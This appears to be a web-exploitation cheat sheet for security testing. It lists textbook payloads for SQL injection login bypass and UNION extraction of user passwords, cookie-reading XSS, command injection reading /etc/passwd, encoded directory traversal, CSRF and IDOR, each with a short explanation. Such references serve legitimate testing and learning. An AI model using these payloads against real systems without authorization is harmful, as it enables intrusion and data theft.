Web Exploitation

SQL injection, XSS, CSRF, authentication bypass, and other web vulnerabilities

SQL Injection - Basic

' OR '1'='1
' OR '1'='1' --
' OR 1=1 --

Basic SQL injection payloads to test login forms and query filters. These bypass authentication by manipulating SQL logic. Test with quotes and comment syntax.

sqli web injection

SQL Injection - Union-Based

' UNION SELECT NULL,NULL,NULL --
' UNION SELECT table_name FROM information_schema.tables --
' UNION SELECT username,password FROM users --

Union-based SQLi extracts data by appending UNION SELECT statements. Match column count first, then retrieve database schema and sensitive data.

sqli web extraction

Cross-Site Scripting (XSS)

<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
'><script>alert(document.cookie)</script>

XSS payloads inject malicious JavaScript into web pages. Can steal cookies, credentials, or perform actions on behalf of users. Test in input fields and URL parameters.

xss web injection

Command Injection

; cat /etc/passwd
| whoami
&& id
`whoami`
$(whoami)

Inject OS commands through vulnerable input fields. Use command separators like ;, |, &&, backticks, or $() syntax. Often found in ping/traceroute functionality.

burpsuite

Use Burp Suite to intercept and modify web requests for testing SQL injection and other vulnerabilities. The professional version includes automated scanners.

Directory Traversal

../../../etc/passwd
....//....//....//etc/passwd
..%252f..%252fetc%252fpasswd

Access files outside the intended directory by traversing the filesystem. Use ../, encoded variations, or null bytes. Common in file download functionality.

traversal web disclosure

CSRF Token Bypass

# Remove CSRF token parameter
# Use expired or duplicate tokens
# Test with blank token value

Cross-Site Request Forgery exploits missing or weak token validation. Try removing tokens, using old values, or crafting forged requests from external sites.

csrf web auth

Authentication Bypass

admin' --
admin' OR 1=1 --
admin' /*
admin') --

Bypass login pages using SQL injection, default credentials, or comment injection. Test common usernames like admin, test, guest with simple payloads.

auth web bypass

Insecure Direct Object Reference (IDOR)

/user/profile?id=1
/user/profile?id=2
/user/profile?id=admin

Access other users' data by manipulating object references like user IDs. Test sequential, predictable, and known IDs to bypass authorization checks.

idor web auth

Web Scraping with curl

curl -L http://example.com
curl -H "User-Agent: Mozilla/5.0" http://example.com
curl -b cookies.txt http://example.com

Extract web content for analysis. -L follows redirects, -H sets headers, -b sends cookies. Useful for gathering information from dynamic content and authenticated pages.
